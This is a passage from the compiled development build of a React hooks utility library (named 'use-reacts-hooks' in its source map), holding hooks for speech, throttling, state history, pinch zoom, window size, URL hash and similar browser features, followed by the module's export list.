        startScrubbing();
        onMouseMove(event);
      };
      var onMouseMove = options.vertical ? function (event) {
        return onScrub(event.clientY);
      } : function (event) {
        return onScrub(event.clientX);
      };
      var onTouchStart = function onTouchStart(event) {
        startScrubbing();
        onTouchMove(event);
      };
      var onTouchMove = options.vertical ? function (event) {
        return onScrub(event.changedTouches[0].clientY);
      } : function (event) {
        return onScrub(event.changedTouches[0].clientX);
      };
      var bindEvents = function bindEvents() {
        on(document, 'mousemove', onMouseMove);
        on(document, 'mouseup', stopScrubbing);
        on(document, 'touchmove', onTouchMove);
        on(document, 'touchend', stopScrubbing);
      };
      var unbindEvents = function unbindEvents() {
        off(document, 'mousemove', onMouseMove);
        off(document, 'mouseup', stopScrubbing);
        off(document, 'touchmove', onTouchMove);
        off(document, 'touchend', stopScrubbing);
      };
      var onScrub = function onScrub(clientXY) {
        cancelAnimationFrame(frame.current);
        frame.current = requestAnimationFrame(function () {
          if (isMounted() && ref.current) {
            var rect = ref.current.getBoundingClientRect();
            var pos = options.vertical ? rect.top : rect.left;
            var length = options.vertical ? rect.height : rect.width;
            // Prevent returning 0 when element is hidden by CSS
            if (!length) {
              return;
            }
            var value = (clientXY - pos) / length;
            if (value > 1) {
              value = 1;
            } else if (value < 0) {
              value = 0;
            }
            if (reverse) {
              value = 1 - value;
            }
            setState({
              value: value
            });
            (options.onScrub || noop)(value);
          }
        });
      };
      on(ref.current, 'mousedown', onMouseDown);
      on(ref.current, 'touchstart', onTouchStart);
      return function () {
        off(ref.current, 'mousedown', onMouseDown);
        off(ref.current, 'touchstart', onTouchStart);
      };
    } else {
      return undefined;
    }
  }, [ref, options.vertical]);
  return state;
};

var Status;
(function (Status) {
  Status[Status["init"] = 0] = "init";
  Status[Status["play"] = 1] = "play";
  Status[Status["pause"] = 2] = "pause";
  Status[Status["end"] = 3] = "end";
})(Status || (Status = {}));
var useSpeech = function useSpeech(text, options) {
  var mounted = React.useRef(false);
  var _useState = React.useState(function () {
      var _ref = options.voice || {},
        _ref$lang = _ref.lang,
        lang = _ref$lang === void 0 ? 'default' : _ref$lang,
        _ref$name = _ref.name,
        name = _ref$name === void 0 ? '' : _ref$name;
      return {
        isPlaying: false,
        status: Status[Status.init],
        lang: options.lang || 'default',
        voiceInfo: {
          lang: lang,
          name: name
        },
        rate: options.rate || 1,
        pitch: options.pitch || 1,
        volume: options.volume || 1
      };
    }),
    state = _useState[0],
    setState = _useState[1];
  var handlePlay = React.useCallback(function () {
    if (!mounted.current) {
      return;
    }
    setState(function (preState) {
      return _extends({}, preState, {
        isPlaying: true,
        status: Status[Status.play]
      });
    });
  }, []);
  var handlePause = React.useCallback(function () {
    if (!mounted.current) {
      return;
    }
    setState(function (preState) {
      return _extends({}, preState, {
        isPlaying: false,
        status: Status[Status.pause]
      });
    });
  }, []);
  var handleEnd = React.useCallback(function () {
    if (!mounted.current) {
      return;
    }
    setState(function (preState) {
      return _extends({}, preState, {
        isPlaying: false,
        status: Status[Status.end]
      });
    });
  }, []);
  React.useEffect(function () {
    mounted.current = true;
    var utterance = new SpeechSynthesisUtterance(text);
    options.lang && (utterance.lang = options.lang);
    options.voice && (utterance.voice = options.voice);
    utterance.rate = options.rate || 1;
    utterance.pitch = options.pitch || 1;
    utterance.volume = options.volume || 1;
    utterance.onstart = handlePlay;
    utterance.onpause = handlePause;
    utterance.onresume = handlePlay;
    utterance.onend = handleEnd;
    window.speechSynthesis.speak(utterance);
    return function () {
      mounted.current = false;
    };
  }, []);
  return state;
};

//@ts-ignore
var isFocusedElementEditable = function isFocusedElementEditable() {
  var _document = document,
    activeElement = _document.activeElement,
    body = _document.body;
  if (!activeElement) {
    return false;
  }
  // If not element has focus, we assume it is not editable, too.
  if (activeElement === body) {
    return false;
  }
  // Assume <input> and <textarea> elements are editable.
  switch (activeElement.tagName) {
    case 'INPUT':
    case 'TEXTAREA':
      return true;
  }
  // Check if any other focused element id editable.
  return activeElement.hasAttribute('contenteditable');
};
var isTypedCharGood = function isTypedCharGood(_ref) {
  var keyCode = _ref.keyCode,
    metaKey = _ref.metaKey,
    ctrlKey = _ref.ctrlKey,
    altKey = _ref.altKey;
  if (metaKey || ctrlKey || altKey) {
    return false;
  }
  // 0...9
  if (keyCode >= 48 && keyCode <= 57) {
    return true;
  }
  // a...z
  if (keyCode >= 65 && keyCode <= 90) {
    return true;
  }
  // All other keys.
  return false;
};
var useStartTyping = function useStartTyping(onStartTyping) {
  useIsomorphicLayoutEffect(function () {
    var keydown = function keydown(event) {
      !isFocusedElementEditable() && isTypedCharGood(event) && onStartTyping(event);
    };
    on(document, 'keydown', keydown);
    return function () {
      off(document, 'keydown', keydown);
    };
  }, []);
};

//@ts-ignore
function useStateWithHistory(initialState, capacity, initialHistory) {
  if (capacity === void 0) {
    capacity = 10;
  }
  if (capacity < 1) {
    throw new Error("Capacity has to be greater than 1, got '" + capacity + "'");
  }
  var isFirstMount = useFirstMountState();
  var _useState = React.useState(initialState),
    state = _useState[0],
    innerSetState = _useState[1];
  var history = React.useRef(initialHistory != null ? initialHistory : []);
  var historyPosition = React.useRef(0);
  // do the states manipulation only on first mount, no sense to load re-renders with useless calculations
  if (isFirstMount) {
    if (history.current.length) {
      // if last element of history !== initial - push initial to history
      if (history.current[history.current.length - 1] !== initialState) {
        history.current.push(initialState);
      }
      // if initial history bigger that capacity - crop the first elements out
      if (history.current.length > capacity) {
        history.current = history.current.slice(history.current.length - capacity);
      }
    } else {
      // initiate the history with initial state
      history.current.push(initialState);
    }
    historyPosition.current = history.current.length && history.current.length - 1;
  }
  var setState = React.useCallback(function (newState) {
    innerSetState(function (currentState) {
      newState = resolveHookState(newState, currentState);
      // is state has changed
      if (newState !== currentState) {
        // if current position is not the last - pop element to the right
        if (historyPosition.current < history.current.length - 1) {
          history.current = history.current.slice(0, historyPosition.current + 1);
        }
        historyPosition.current = history.current.push(newState) - 1;
        // if capacity is reached - shift first elements
        if (history.current.length > capacity) {
          history.current = history.current.slice(history.current.length - capacity);
        }
      }
      return newState;
    });
  }, [state, capacity]);
  var historyState = React.useMemo(function () {
    return {
      history: history.current,
      position: historyPosition.current,
      capacity: capacity,
      back: function back(amount) {
        if (amount === void 0) {
          amount = 1;
        }
        // don't do anything if we already at the left border
        if (!historyPosition.current) {
          return;
        }
        innerSetState(function () {
          historyPosition.current -= Math.min(amount, historyPosition.current);
          return history.current[historyPosition.current];
        });
      },
      forward: function forward(amount) {
        if (amount === void 0) {
          amount = 1;
        }
        // don't do anything if we already at the right border
        if (historyPosition.current === history.current.length - 1) {
          return;
        }
        innerSetState(function () {
          historyPosition.current = Math.min(historyPosition.current + amount, history.current.length - 1);
          return history.current[historyPosition.current];
        });
      },
      go: function go(position) {
        if (position === historyPosition.current) {
          return;
        }
        innerSetState(function () {
          historyPosition.current = position < 0 ? Math.max(history.current.length + position, 0) : Math.min(history.current.length - 1, position);
          return history.current[historyPosition.current];
        });
      }
    };
  }, [state]);
  return [state, setState, historyState];
}

function useStateList(stateSet) {
  if (stateSet === void 0) {
    stateSet = [];
  }
  var isMounted = useMountedState();
  var update = useUpdate();
  var index = React.useRef(0);
  // If new state list is shorter that before - switch to the last element
  useUpdateEffect(function () {
    if (stateSet.length <= index.current) {
      index.current = stateSet.length - 1;
      update();
    }
  }, [stateSet.length]);
  var actions = React.useMemo(function () {
    return {
      next: function next() {
        return actions.setStateAt(index.current + 1);
      },
      prev: function prev() {
        return actions.setStateAt(index.current - 1);
      },
      setStateAt: function setStateAt(newIndex) {
        // do nothing on unmounted component
        if (!isMounted()) return;
        // do nothing on empty states list
        if (!stateSet.length) return;
        // in case new index is equal current - do nothing
        if (newIndex === index.current) return;
        // it gives the ability to travel through the left and right borders.
        // 4ex: if list contains 5 elements, attempt to set index 9 will bring use to 5th element
        // in case of negative index it will start counting from the right, so -17 will bring us to 4th element
        index.current = newIndex >= 0 ? newIndex % stateSet.length : stateSet.length + newIndex % stateSet.length;
        update();
      },
      setState: function setState(state) {
        // do nothing on unmounted component
        if (!isMounted()) return;
        var newIndex = stateSet.length ? stateSet.indexOf(state) : -1;
        if (newIndex === -1) {
          throw new Error("State '" + state + "' is not a valid state (does not exist in state list)");
        }
        index.current = newIndex;
        update();
      }
    };
  }, [stateSet]);
  return _extends({
    state: stateSet[index.current],
    currentIndex: index.current
  }, actions);
}

//@ts-ignore
var useThrottle = function useThrottle(value, ms) {
  if (ms === void 0) {
    ms = 200;
  }
  var _useState = React.useState(value),
    state = _useState[0],
    setState = _useState[1];
  var timeout = React.useRef();
  var nextValue = React.useRef(null);
  var hasNextValue = React.useRef(0);
  React.useEffect(function () {
    if (!timeout.current) {
      setState(value);
      var timeoutCallback = function timeoutCallback() {
        if (hasNextValue.current) {
          hasNextValue.current = false;
          setState(nextValue.current);
          timeout.current = setTimeout(timeoutCallback, ms);
        } else {
          timeout.current = undefined;
        }
      };
      timeout.current = setTimeout(timeoutCallback, ms);
    } else {
      nextValue.current = value;
      hasNextValue.current = true;
    }
  }, [value]);
  useUnmount(function () {
    timeout.current && clearTimeout(timeout.current);
  });
  return state;
};

//@ts-ignore
var useThrottleFn = function useThrottleFn(fn, ms, args) {
  if (ms === void 0) {
    ms = 200;
  }
  var _useState = React.useState(null),
    state = _useState[0],
    setState = _useState[1];
  var timeout = React.useRef();
  var nextArgs = React.useRef();
  React.useEffect(function () {
    if (!timeout.current) {
      setState(fn.apply(void 0, args));
      var timeoutCallback = function timeoutCallback() {
        if (nextArgs.current) {
          setState(fn.apply(void 0, nextArgs.current));
          nextArgs.current = undefined;
          timeout.current = setTimeout(timeoutCallback, ms);
        } else {
          timeout.current = undefined;
        }
      };
      timeout.current = setTimeout(timeoutCallback, ms);
    } else {
      nextArgs.current = args;
    }
  }, args);
  useUnmount(function () {
    timeout.current && clearTimeout(timeout.current);
  });
  return state;
};

//@ts-ignore
function useTimeout(ms) {
  if (ms === void 0) {
    ms = 0;
  }
  var update = useUpdate();
  return useTimeoutFn(update, ms);
}

//@ts-ignore
var DEFAULT_USE_TITLE_OPTIONS = {
  restoreOnUnmount: false
};
function useTitle(title, options) {
  if (options === void 0) {
    options = DEFAULT_USE_TITLE_OPTIONS;
  }
  var prevTitleRef = React.useRef(document.title);
  if (document.title !== title) document.title = title;
  React.useEffect(function () {
    if (options && options.restoreOnUnmount) {
      return function () {
        document.title = prevTitleRef.current;
      };
    } else {
      return;
    }
  }, []);
}
var useTitle$1 = typeof document !== 'undefined' ? useTitle : function (_title) {};

//@ts-ignore
var useTween = function useTween(easingName, ms, delay) {
  if (easingName === void 0) {
    easingName = 'inCirc';
  }
  if (ms === void 0) {
    ms = 200;
  }
  if (delay === void 0) {
    delay = 0;
  }
  var fn = tsEasing.easing[easingName];
  var t = useRaf(ms, delay);
  {
    if (typeof fn !== 'function') {
      console.error('useTween() expected "easingName" property to be a valid easing function name, like:' + '"' + Object.keys(tsEasing.easing).join('", "') + '".');
      console.trace();
      return 0;
    }
  }
  return fn(t);
};

//@ts-ignore
var useUnmountPromise = function useUnmountPromise() {
  var refUnmounted = React.useRef(false);
  useEffectOnce(function () {
    return function () {
      refUnmounted.current = true;
    };
  });
  var wrapper = React.useMemo(function () {
    var race = function race(promise, onError) {
      var newPromise = new Promise(function (resolve, reject) {
        promise.then(function (result) {
          if (!refUnmounted.current) resolve(result);
        }, function (error) {
          if (!refUnmounted.current) reject(error);else if (onError) onError(error);else console.error('useUnmountPromise', error);
        });
      });
      return newPromise;
    };
    return race;
  }, []);
  return wrapper;
};

/**
 * @deprecated Use `useList` hook's upsert action instead
 */
function useUpsert(predicate, initialList) {
  if (initialList === void 0) {
    initialList = [];
  }
  var _useList = useList(initialList),
    list = _useList[0],
    listActions = _useList[1];
  return [list, _extends({}, listActions, {
    upsert: function upsert(newItem) {
      listActions.upsert(predicate, newItem);
    }
  })];
}

//@ts-ignore
var isVibrationApiSupported = isNavigator && 'vibrate' in navigator;
function useVibrate(enabled, pattern, loop) {
  if (enabled === void 0) {
    enabled = true;
  }
  if (pattern === void 0) {
    pattern = [1000, 1000];
  }
  if (loop === void 0) {
    loop = true;
  }
  React.useEffect(function () {
    var interval;
    if (enabled) {
      navigator.vibrate(pattern);
      if (loop) {
        var duration = pattern instanceof Array ? pattern.reduce(function (a, b) {
          return a + b;
        }) : pattern;
        interval = setInterval(function () {
          navigator.vibrate(pattern);
        }, duration);
      }
    }
    return function () {
      if (enabled) {
        navigator.vibrate(0);
        if (loop) {
          clearInterval(interval);
        }
      }
    };
  }, [enabled]);
}
var useVibrate$1 = isVibrationApiSupported ? useVibrate : noop;

//@ts-ignore
var useVideo = /*#__PURE__*/createHTMLMediaHook('video');

//@ts-ignore
function useStateValidator(state, validator, initialState) {
  if (initialState === void 0) {
    initialState = [undefined];
  }
  var validatorInner = React.useRef(validator);
  var stateInner = React.useRef(state);
  validatorInner.current = validator;
  stateInner.current = state;
  var _useState = React.useState(initialState),
    validity = _useState[0],
    setValidity = _useState[1];
  var validate = React.useCallback(function () {
    if (validatorInner.current.length >= 2) {
      validatorInner.current(stateInner.current, setValidity);
    } else {
      setValidity(validatorInner.current(stateInner.current));
    }
  }, [setValidity]);
  React.useEffect(function () {
    validate();
  }, [state]);
  return [validity, validate];
}

//@ts-ignore
function useScrollbarWidth() {
  var _useState = React.useState(scrollbarWidth.scrollbarWidth()),
    sbw = _useState[0],
    setSbw = _useState[1];
  // this needed to ensure the scrollbar width in case hook called before the DOM is ready
  React.useEffect(function () {
    if (typeof sbw !== 'undefined') {
      return;
    }
    var raf = requestAnimationFrame(function () {
      setSbw(scrollbarWidth.scrollbarWidth());
    });
    return function () {
      return cancelAnimationFrame(raf);
    };
  }, []);
  return sbw;
}

//@ts-ignore
function useMultiStateValidator(states, validator, initialValidity) {
  if (initialValidity === void 0) {
    initialValidity = [undefined];
  }
  if (typeof states !== 'object') {
    throw new Error('states expected to be an object or array, got ' + typeof states);
  }
  var validatorInner = React.useRef(validator);
  var statesInner = React.useRef(states);
  validatorInner.current = validator;
  statesInner.current = states;
  var _useState = React.useState(initialValidity),
    validity = _useState[0],
    setValidity = _useState[1];
  var validate = React.useCallback(function () {
    if (validatorInner.current.length >= 2) {
      validatorInner.current(statesInner.current, setValidity);
    } else {
      setValidity(validatorInner.current(statesInner.current));
    }
  }, [setValidity]);
  React.useEffect(function () {
    validate();
  }, Object.values(states));
  return [validity, validate];
}

//@ts-ignore
var useWindowScroll = function useWindowScroll() {
  var _useRafState = useRafState(function () {
      return {
        x: isBrowser ? window.pageXOffset : 0,
        y: isBrowser ? window.pageYOffset : 0
      };
    }),
    state = _useRafState[0],
    setState = _useRafState[1];
  React.useEffect(function () {
    var handler = function handler() {
      setState(function (state) {
        var _window = window,
          pageXOffset = _window.pageXOffset,
          pageYOffset = _window.pageYOffset;
        //Check state for change, return same state if no change happened to prevent rerender
        //(see useState/setState documentation). useState/setState is used internally in useRafState/setState.
        return state.x !== pageXOffset || state.y !== pageYOffset ? {
          x: pageXOffset,
          y: pageYOffset
        } : state;
      });
    };
    //We have to update window scroll at mount, before subscription.
    //Window scroll may be changed between render and effect handler.
    handler();
    on(window, 'scroll', handler, {
      capture: false,
      passive: true
    });
    return function () {
      off(window, 'scroll', handler);
    };
  }, []);
  return state;
};

//@ts-ignore
var useWindowSize = function useWindowSize(initialWidth, initialHeight) {
  if (initialWidth === void 0) {
    initialWidth = Infinity;
  }
  if (initialHeight === void 0) {
    initialHeight = Infinity;
  }
  var _useRafState = useRafState({
      width: isBrowser ? window.innerWidth : initialWidth,
      height: isBrowser ? window.innerHeight : initialHeight
    }),
    state = _useRafState[0],
    setState = _useRafState[1];
  React.useEffect(function () {
    if (isBrowser) {
      var handler = function handler() {
        setState({
          width: window.innerWidth,
          height: window.innerHeight
        });
      };
      on(window, 'resize', handler);
      return function () {
        off(window, 'resize', handler);
      };
    }
  }, []);
  return state;
};

//@ts-ignore
var defaultState$2 = {
  x: 0,
  y: 0,
  width: 0,
  height: 0,
  top: 0,
  left: 0,
  bottom: 0,
  right: 0
};
function useMeasure() {
  var _useState = React.useState(null),
    element = _useState[0],
    ref = _useState[1];
  var _useState2 = React.useState(defaultState$2),
    rect = _useState2[0],
    setRect = _useState2[1];
  var observer = React.useMemo(function () {
    return new window.ResizeObserver(function (entries) {
      if (entries[0]) {
        var _entries$0$contentRec = entries[0].contentRect,
          x = _entries$0$contentRec.x,
          y = _entries$0$contentRec.y,
          width = _entries$0$contentRec.width,
          height = _entries$0$contentRec.height,
          top = _entries$0$contentRec.top,
          left = _entries$0$contentRec.left,
          bottom = _entries$0$contentRec.bottom,
          right = _entries$0$contentRec.right;
        setRect({
          x: x,
          y: y,
          width: width,
          height: height,
          top: top,
          left: left,
          bottom: bottom,
          right: right
        });
      }
    });
  }, []);
  useIsomorphicLayoutEffect(function () {
    if (!element) return;
    observer.observe(element);
    return function () {
      observer.disconnect();
    };
  }, [element]);
  return [ref, rect];
}
var useMeasure$1 = isBrowser && typeof window.ResizeObserver !== 'undefined' ? useMeasure : function () {
  return [noop, defaultState$2];
};

//@ts-ignore
var ZoomState;
(function (ZoomState) {
  ZoomState["ZOOMING_IN"] = "ZOOMING_IN";
  ZoomState["ZOOMING_OUT"] = "ZOOMING_OUT";
})(ZoomState || (ZoomState = {}));
var usePinchZoom = function usePinchZoom(ref) {
  var cacheRef = React.useMemo(function () {
    return {
      evCache: [],
      prevDiff: -1
    };
  }, [ref.current]);
  var _useState = React.useState(),
    zoomingState = _useState[0],
    setZoomingState = _useState[1];
  var pointermove_handler = function pointermove_handler(ev) {
    // This function implements a 2-pointer horizontal pinch/zoom gesture.
    //
    // If the distance between the two pointers has increased (zoom in),
    // the target element's background is changed to 'pink' and if the
    // distance is decreasing (zoom out), the color is changed to 'lightblue'.
    //
    // This function sets the target element's border to 'dashed' to visually
    // indicate the pointer's target received a move event.
    // Find this event in the cache and update its record with this event
    for (var i = 0; i < cacheRef.evCache.length; i++) {
      if (ev.pointerId == cacheRef.evCache[i].pointerId) {
        cacheRef.evCache[i] = ev;
        break;
      }
    }
    // If two pointers are down, check for pinch gestures
    if (cacheRef.evCache.length == 2) {
      // console.log(prevDiff)
      // Calculate the distance between the two pointers
      var curDiff = Math.abs(cacheRef.evCache[0].clientX - cacheRef.evCache[1].clientX);
      if (cacheRef.prevDiff > 0) {
        if (curDiff > cacheRef.prevDiff) {
          // The distance between the two pointers has increased
          setZoomingState([ZoomState.ZOOMING_IN, curDiff]);
        }
        if (curDiff < cacheRef.prevDiff) {
          // The distance between the two pointers has decreased
          setZoomingState([ZoomState.ZOOMING_OUT, curDiff]);
        }
      }
      // Cache the distance for the next move event
      cacheRef.prevDiff = curDiff;
    }
  };
  var pointerdown_handler = function pointerdown_handler(ev) {
    // The pointerdown event signals the start of a touch interaction.
    // This event is cached to support 2-finger gestures
    cacheRef.evCache.push(ev);
    // console.log('pointerDown', ev);
  };

  var pointerup_handler = function pointerup_handler(ev) {
    // Remove this pointer from the cache and reset the target's
    // background and border
    remove_event(ev);
    // If the number of pointers down is less than two then reset diff tracker
    if (cacheRef.evCache.length < 2) {
      cacheRef.prevDiff = -1;
    }
  };
  var remove_event = function remove_event(ev) {
    // Remove this event from the target's cache
    for (var i = 0; i < cacheRef.evCache.length; i++) {
      if (cacheRef.evCache[i].pointerId == ev.pointerId) {
        cacheRef.evCache.splice(i, 1);
        break;
      }
    }
  };
  React.useEffect(function () {
    if (ref != null && ref.current) {
      ref.current.onpointerdown = pointerdown_handler;
      ref.current.onpointermove = pointermove_handler;
      ref.current.onpointerup = pointerup_handler;
      ref.current.onpointercancel = pointerup_handler;
      ref.current.onpointerout = pointerup_handler;
      ref.current.onpointerleave = pointerup_handler;
    }
  }, [ref == null ? void 0 : ref.current]);
  return zoomingState ? {
    zoomingState: zoomingState[0],
    pinchState: zoomingState[1]
  } : {
    zoomingState: null,
    pinchState: 0
  };
};

//@ts-ignore
function useRendersCount() {
  return ++React.useRef(0).current;
}

var useSet = function useSet(initialSet) {
  if (initialSet === void 0) {
    initialSet = new Set();
  }
  var _useState = React.useState(initialSet),
    set = _useState[0],
    setSet = _useState[1];
  var stableActions = React.useMemo(function () {
    var add = function add(item) {
      return setSet(function (prevSet) {
        return new Set([].concat(Array.from(prevSet), [item]));
      });
    };
    var remove = function remove(item) {
      return setSet(function (prevSet) {
        return new Set(Array.from(prevSet).filter(function (i) {
          return i !== item;
        }));
      });
    };
    var toggle = function toggle(item) {
      return setSet(function (prevSet) {
        return prevSet.has(item) ? new Set(Array.from(prevSet).filter(function (i) {
          return i !== item;
        })) : new Set([].concat(Array.from(prevSet), [item]));
      });
    };
    return {
      add: add,
      remove: remove,
      toggle: toggle,
      reset: function reset() {
        return setSet(initialSet);
      }
    };
  }, [setSet]);
  var utils = _extends({
    has: React.useCallback(function (item) {
      return set.has(item);
    }, [set])
  }, stableActions);
  return [set, utils];
};

function createGlobalState(initialState) {
  var store = {
    state: initialState instanceof Function ? initialState() : initialState,
    setState: function setState(nextState) {
      store.state = resolveHookState(nextState, store.state);
      store.setters.forEach(function (setter) {
        return setter(store.state);
      });
    },
    setters: []
  };
  return function () {
    var _useState = React.useState(store.state),
      globalState = _useState[0],
      stateSetter = _useState[1];
    useEffectOnce(function () {
      return function () {
        store.setters = store.setters.filter(function (setter) {
          return setter !== stateSetter;
        });
      };
    });
    useIsomorphicLayoutEffect(function () {
      if (!store.setters.includes(stateSetter)) {
        store.setters.push(stateSetter);
      }
    });
    return [globalState, store.setState];
  };
}

//@ts-ignore
/**
 * read and write url hash, response to url hash change
 */
var useHash = function useHash() {
  var _useState = React.useState(function () {
      return window.location.hash;
    }),
    hash = _useState[0],
    setHash = _useState[1];
  var onHashChange = React.useCallback(function () {
    setHash(window.location.hash);
  }, []);
  useLifecycles(function () {
    on(window, 'hashchange', onHashChange);
  }, function () {
    off(window, 'hashchange', onHashChange);
  });
  var _setHash = React.useCallback(function (newHash) {
    if (newHash !== hash) {
      window.location.hash = newHash;
    }
  }, [hash]);
  return [hash, _setHash];
};

console.log('STARTING __');

exports.createBreakpoint = createBreakpoint;
exports.createGlobalState = createGlobalState;
exports.createMemo = createMemo;
exports.createReducer = createReducer;
exports.createReducerContext = createReducerContext;
exports.createStateContext = createStateContext;
exports.ensuredForwardRef = ensuredForwardRef;
exports.useAsync = useAsync;
exports.useAsyncFn = useAsyncFn;
exports.useAsyncRetry = useAsyncRetry;
exports.useAudio = useAudio;
exports.useBattery = useBattery$1;
exports.useBeforeUnload = useBeforeUnload;
exports.useBoolean = useToggle;
exports.useClickAway = useClickAway;
exports.useCookie = useCookie;
exports.useCopyToClipboard = useCopyToClipboard;
exports.useCounter = useCounter;
exports.useCss = useCss;
exports.useCustomCompareEffect = useCustomCompareEffect;
exports.useDebounce = useDebounce;
exports.useDeepCompareEffect = useDeepCompareEffect;
exports.useDefault = useDefault;
exports.useDrop = useDrop;
exports.useDropArea = useDropArea;
exports.useEffectOnce = useEffectOnce;
exports.useEnsuredForwardedRef = useEnsuredForwardedRef;
exports.useError = useError;
exports.useEvent = useEvent;
exports.useFavicon = useFavicon;
exports.useFirstMountState = useFirstMountState;
exports.useFullscreen = useFullscreen;
exports.useGeolocation = useGeolocation;
exports.useGetSet = useGetSet;
exports.useGetSetState = useGetSetState;
exports.useHarmonicIntervalFn = useHarmonicIntervalFn;
exports.useHash = useHash;
exports.useHover = useHover;
exports.useHoverDirty = useHoverDirty;
exports.useIdle = useIdle;
exports.useIntersection = useIntersection;
exports.useInterval = useInterval;
exports.useIsomorphicLayoutEffect = useIsomorphicLayoutEffect;
exports.useKey = useKey;
exports.useKeyPress = useKeyPress;
exports.useKeyPressEvent = useKeyPressEvent;
exports.useLatest = useLatest;
exports.useLifecycles = useLifecycles;
exports.useList = useList;
exports.useLocalStorage = useLocalStorage;
exports.useLocation = useLocation;
exports.useLockBodyScroll = useLockBodyScroll;
exports.useLogger = useLogger;
exports.useLongPress = useLongPress;
exports.useMap = useMap;
exports.useMeasure = useMeasure$1;
exports.useMedia = useMedia;
exports.useMediaDevices = useMediaDevices$1;
exports.useMediatedState = useMediatedState;
exports.useMethods = useMethods;
exports.useMotion = useMotion;
exports.useMount = useMount;
exports.useMountedState = useMountedState;
exports.useMouse = useMouse;
exports.useMouseHovered = useMouseHovered;
exports.useMouseWheel = useMouseWheel;
exports.useMultiStateValidator = useMultiStateValidator;
exports.useNetworkState = useNetworkState;
exports.useNumber = useCounter;
exports.useObservable = useObservable;
exports.useOrientation = useOrientation;
exports.usePageLeave = usePageLeave;
exports.usePermission = usePermission;
exports.usePinchZoom = usePinchZoom;
exports.usePrevious = usePrevious;
exports.usePreviousDistinct = usePreviousDistinct;
exports.usePromise = usePromise;
exports.useQueue = useQueue;
exports.useRaf = useRaf;
exports.useRafLoop = useRafLoop;
exports.useRafState = useRafState;
exports.useRendersCount = useRendersCount;
exports.useScratch = useScratch;
exports.useScroll = useScroll;
exports.useScrollbarWidth = useScrollbarWidth;
exports.useScrolling = useScrolling;
exports.useSearchParam = useSearchParam$1;
exports.useSessionStorage = useSessionStorage;
exports.useSet = useSet;
exports.useSetState = useSetState;
exports.useShallowCompareEffect = useShallowCompareEffect;
exports.useSize = useSize;
exports.useSlider = useSlider;
exports.useSpeech = useSpeech;
exports.useStartTyping = useStartTyping;
exports.useStateList = useStateList;
exports.useStateValidator = useStateValidator;
exports.useStateWithHistory = useStateWithHistory;
exports.useThrottle = useThrottle;
exports.useThrottleFn = useThrottleFn;
exports.useTimeout = useTimeout;
exports.useTimeoutFn = useTimeoutFn;
exports.useTitle = useTitle$1;
exports.useToggle = useToggle;
exports.useTween = useTween;
exports.useUnmount = useUnmount;
exports.useUnmountPromise = useUnmountPromise;
exports.useUpdate = useUpdate;
exports.useUpdateEffect = useUpdateEffect;
exports.useUpsert = useUpsert;
exports.useVibrate = useVibrate$1;
exports.useVideo = useVideo;
exports.useWindowScroll = useWindowScroll;
exports.useWindowSize = useWindowSize;
//# sourceMappingURL=use-reacts-hooks.cjs.development.js.map
